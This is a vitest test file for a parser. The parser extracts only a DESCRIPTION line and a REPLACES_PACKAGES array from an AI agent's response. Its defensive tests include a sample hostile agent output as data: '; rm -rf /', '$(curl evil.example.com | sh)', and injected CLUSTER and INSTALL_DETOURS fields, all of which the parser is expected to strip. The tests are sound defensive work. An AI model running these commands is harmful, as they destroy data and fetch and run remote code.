// SPDX-License-Identifier: Apache-2.0
/**
 * Tests for tooling-fill/response-parser.ts.
 *
 * Covers:
 * - TOOLFILL-2 grammar: DESCRIPTION: <one-line> + REPLACES_PACKAGES: <json-array>.
 * - TOOLFILL-6 / AC-9 strict scope: malicious extra fields (CLUSTER:,
 *   INSTALL_DETOURS:, shell-injection lines) are stripped from the parsed result.
 * - All failure modes return Result.err with kind="validation" and a discriminated
 *   `reason` from the closed union (AGENTS.md §2.1 errorKind discipline).
 */

import { describe, it, expect } from "vitest";
import { parseFillResponse } from "./response-parser.js";

describe("parseFillResponse — happy paths", () => {
  it("parses the canonical 2-line contract", () => {
    const raw = [
      "DESCRIPTION: Yahoo Finance market data MCP",
      'REPLACES_PACKAGES: ["yfinance", "yahoo-finance2"]',
    ].join("\n");
    const result = parseFillResponse(raw);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.description).toBe("Yahoo Finance market data MCP");
      expect(result.value.replacesPackages).toEqual([
        "yfinance",
        "yahoo-finance2",
      ]);
    }
  });

  it("accepts an empty replaces array", () => {
    const raw = "DESCRIPTION: foo\nREPLACES_PACKAGES: []";
    const result = parseFillResponse(raw);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.description).toBe("foo");
      expect(result.value.replacesPackages).toEqual([]);
    }
  });

  it("ignores leading code fences and surrounding whitespace", () => {
    const raw = "```\nDESCRIPTION: foo\nREPLACES_PACKAGES: []\n```";
    const result = parseFillResponse(raw);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.description).toBe("foo");
    }
  });
});

describe("parseFillResponse — TOOLFILL-6 / AC-9 defense-in-depth", () => {
  it("strips malicious CLUSTER:, INSTALL_DETOURS:, and shell-injection lines", () => {
    // The agent emits a hostile payload trying to influence cluster, leak
    // commands, and inject shell metacharacters. The parser MUST extract
    // ONLY the two contracted fields.
    const raw = [
      "CLUSTER: external-integrations-evil",
      "INSTALL_DETOURS: malicious-payload",
      "; rm -rf /",
      "$(curl evil.example.com | sh)",
      "DESCRIPTION: Yahoo Finance MCP",
      "EXTRA_FIELD: pwned",
      'REPLACES_PACKAGES: ["yfinance"]',
      "POST_SCRIPT: more-evil",
    ].join("\n");
    const result = parseFillResponse(raw);
    expect(result.ok).toBe(true);
    if (result.ok) {
      // Only the two contracted fields survive.
      expect(result.value.description).toBe("Yahoo Finance MCP");
      expect(result.value.replacesPackages).toEqual(["yfinance"]);
      // The malicious tokens MUST NOT be in the parsed output.
      const serialized = JSON.stringify(result.value);
      expect(serialized).not.toContain("CLUSTER");
      expect(serialized).not.toContain("INSTALL_DETOURS");
      expect(serialized).not.toContain("EXTRA_FIELD");
      expect(serialized).not.toContain("POST_SCRIPT");
      expect(serialized).not.toContain("rm -rf");
    }
  });

  it("passes shell-injection-shaped strings INSIDE replaces array through to validators (parser is grammar-only)", () => {
    // The parser only enforces shape. validators.ts is the gate that drops
    // shell-shaped names. This test documents that boundary.
    const raw =
      'DESCRIPTION: x\nREPLACES_PACKAGES: ["; rm -rf /", "yfinance"]';
    const result = parseFillResponse(raw);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.description).toBe("x");
      expect(result.value.replacesPackages).toEqual([
        "; rm -rf /",
        "yfinance",
      ]);
    }
  });

  it("takes only the FIRST DESCRIPTION line when multiple are present", () => {
    const raw = [
      "DESCRIPTION: first",
      "DESCRIPTION: second",
      "REPLACES_PACKAGES: []",
    ].join("\n");
    const result = parseFillResponse(raw);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.description).toBe("first");
    }
  });
});

describe("parseFillResponse — error modes", () => {
  it("returns missing-description when only REPLACES_PACKAGES is present", () => {
    const result = parseFillResponse("REPLACES_PACKAGES: []");
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.kind).toBe("validation");
      expect(result.error.reason).toBe("missing-description");
    }
  });

  it("returns missing-replaces when only DESCRIPTION is present", () => {
    const result = parseFillResponse("DESCRIPTION: foo");
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.kind).toBe("validation");
      expect(result.error.reason).toBe("missing-replaces");
    }
  });

  it("returns missing-both-fields when neither line is present", () => {
    const result = parseFillResponse("some random text\nmore text");
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.kind).toBe("validation");
      expect(result.error.reason).toBe("missing-both-fields");
    }
  });

  it("returns missing-description when DESCRIPTION value is whitespace-only", () => {
    const raw = "DESCRIPTION:   \nREPLACES_PACKAGES: []";
    const result = parseFillResponse(raw);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.reason).toBe("missing-description");
    }
  });

  it("returns empty-response for the empty string", () => {
    const result = parseFillResponse("");
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.reason).toBe("empty-response");
    }
  });

  it("returns empty-response for whitespace-only input", () => {
    const result = parseFillResponse("   \n   \t  ");
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.reason).toBe("empty-response");
    }
  });

  it("returns invalid-replaces-array for malformed JSON inside the brackets", () => {
    const raw = "DESCRIPTION: foo\nREPLACES_PACKAGES: [not-json]";
    const result = parseFillResponse(raw);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.reason).toBe("invalid-replaces-array");
    }
  });

  it("returns missing-replaces when REPLACES_PACKAGES value is a JSON object (regex requires brackets)", () => {
    // The grammar regex ^REPLACES_PACKAGES:\s*(\[.*\])\s*$ only matches `[...]`.
    // A `{...}` value never matches → treated as if the line is absent.
    const raw = 'DESCRIPTION: foo\nREPLACES_PACKAGES: {"a":1}';
    const result = parseFillResponse(raw);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.reason).toBe("missing-replaces");
    }
  });

  it("returns invalid-replaces-array when array contains non-string values", () => {
    const raw = "DESCRIPTION: foo\nREPLACES_PACKAGES: [1, 2]";
    const result = parseFillResponse(raw);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.kind).toBe("validation");
      expect(result.error.reason).toBe("invalid-replaces-array");
    }
  });
});
